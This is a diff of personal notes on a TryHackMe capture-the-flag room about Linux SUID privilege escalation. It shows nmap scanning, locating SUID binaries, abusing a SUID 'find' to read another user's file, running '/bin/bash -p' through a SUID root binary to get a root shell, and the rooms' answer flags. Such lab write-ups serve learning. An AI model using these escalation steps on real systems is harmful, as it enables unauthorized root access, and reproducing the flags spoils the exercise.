@@ -5,7 +5,8 @@
 https://tryhackme.com/room/25daysofchristmas
 
 https://muirlandoracle.co.uk/2020/01/06/tryhackme-christmas-2019-challenge-write-up/#Day_Eight_-_SUID_Shenanigans
-samanthactf.medium.com/tryhackme-advent-of-cyber-day-8-suid-shenanigans-a1a94316df9e 
+https://blog.dhilipsanjay.in/ctfs/tryhackme/tryhackme/adventofcyber1/day08-suidshenanigans
+
 
 Elf Holly is suspicious of Elf-ministrator and wants to get onto the root account of a server he setup to see what files are on his account. 
 The problem is, Holly is a low-privileged user. can you escalate her privileges and hack your way into the root account?
@@ -26,13 +27,11 @@ networks.
 
 a. What port is SSH running on?
 Hint: 65534 is the port number.. But can you find out how to login via SSH on this port?
-answer
+answer:
  
-
-
-you can use the command 'nmap -p- -sV 10.112.141.25' 
-        -Sv : Search (by default on TCP) for service version detection
-        -p- : Search all ports
+ nmap -sC -sV -p- <IP> -oN nmap.out
+ 
+      
 but it will take a long time
 so we cand use the hint - 65534
 
@@ -50,25 +49,8 @@ You don't  have the ability to read the file: /home/igor/flag1.txt.
  Igor is presumably another user on the system, but why would find be highlighted? Given that this task is about SUID bits, let’s have a look to see who exactly is executing the find command. 	
   Usually it would be the current user, but what if the file which executes the find command (/usr/bin/find ) was owned by someone else, with, perhaps, the s bit set?
 
-Run the command:
-
-ls -l /usr/bin/find
-
-Yes! The find command is actually owned by Igor — but we have permission to run it because it has the SUID bit set.
-
- SUID bit allows anyone to execute a file as if they were its owner. A good example of this would be the passwd binary, which allows a user to change their password. This file is owned by root, but all users need to be able to change their own passwords — thus the file has its SUID bit set to allow anyone to run the file as if they were the owner (i.e. root)!
-
- The find command comes with the option to execute further commands, like so:
- find file-name -exec command \;	
-	 the  \;  mark the end of  commasd  of  the  -exec
- We know where the flag is ( home/igor/flag1.txt ), because we can navigate into Igor’s home directory as Holly and see for ourselves. In this instance we may as well use the command:
- 
-  find /home/igor/flag1.txt -exec cat /home/igor/flag1.txt \;	
-	
-	
- Using the supporting materials as my guide,
- (https://tryhackme.com/resources/blog/linux-privilege-escalation-suid/)
- I executed the following command:
+Let’s   list  files owned by igor with the SUID bit set. 
+ To Do that execute the following command:
 
     find / -user igor -perm -4000 -exec ls -ldb {} \; 2>/dev/null	
 	find / -user igor:  look in the system all  filles owned by user igor 
@@ -77,5 +59,68 @@ Yes! The find command is actually owned by Igor — but we have permission to ru
 		  Setuid allows to run a file with the the permissn of the file owner
 	exec ls -ldb {} \;  : for every  file that was found run the command ls -ldb <file
 
+ The output of this command is :
+ 
+     -rwsr-xr-x 1 igor igor 221768 Feb  7  2016 /usr/bin/find
+     -rwsr-xr-x 1 igor igor 2770528 Mar 31  2016 /usr/bin/nmap
 
- so the find command is owned by igor and the file flag1.txt is owned igor. so  we can  find command on flag1.txt .  by combing the  -exec cat /home/igor/flag1.txt \;    we can read the flag1.txt
+
+
+
+Yes! The find command is actually owned by Igor — but we have permission to run it because it has the SUID bit set.
+
+ SUID bit allows anyone to execute a file as if they were its owner. 
+ A good example of this would be the passwd binary, which allows a user to change their password. This file is owned by root, but all users need to be able to change their own passwords — thus the file has its SUID bit set to allow anyone to run the file as if they were the owner (i.e. root)!
+
+ The find command comes with the option to execute further commands, like so:
+ find file-name -exec command \;	
+	 the  '  \;  '  mark the end of  commasd  of  the  -exec
+ We know where the flag is ( home/igor/flag1.txt ), because we can navigate 
+ into Igor’s home directory as Holly and see for ourselves. ( ls -l /usr/bin/find)
+ -r-------- 1 igor igor 38 Dec  7  2019 /home/igor/flag1.tx
+ 
+ In this instance we may as well use the command:
+ 
+  find /home/igor/flag1.txt -exec cat /home/igor/flag1.txt \;	
+The outout is :
+ THM{d3f0708bdd9accda7f937d013eaf2cd8}
+
+	
+
+ so the find command is owned by igor and the file flag1.txt is owned igor.
+ so  we can  find command on flag1.txt .  
+ by combing the  -exec cat /home/igor/flag1.txt \;   
+ we can read the flag1.txt
+
+
+c. Find another binary file that has the SUID bit set. Using this file, can you
+ become the root user and read the /root/flag2.txt file?
+ 
+ the file is    /usr/bin/system-control  but how it was found is un clear .
+ one wa is to run:   ls -la /usr/bin/system-control
+ the output is 
+-rwsrwxr-x 1 root root 8880 Dec  7  2019 /usr/bin/system-control
+
+ 
+ we can use the file because in the privilage it has 's' instade of 'x'
+
+so run :/usr/bin/system-control
+===== System Control Binary =====
+
+Enter system command: whoami
+root
+bash-4.3$ /usr/bin/system-control
+
+===== System Control Binary =====
+
+Enter system command: /bin/bash -p
+
+root@ip-10-10-1-202:/home/igor# cd /root/
+root@ip-10-10-1-202:/root# ls
+flag2.txt  snap
+
+root@ip-10-10-1-202:/root# cat flag2.txt 
+THM{REDACTED}
+ 
+ 
+ THM{8c8211826239d849fa8d6df03749c3a2}
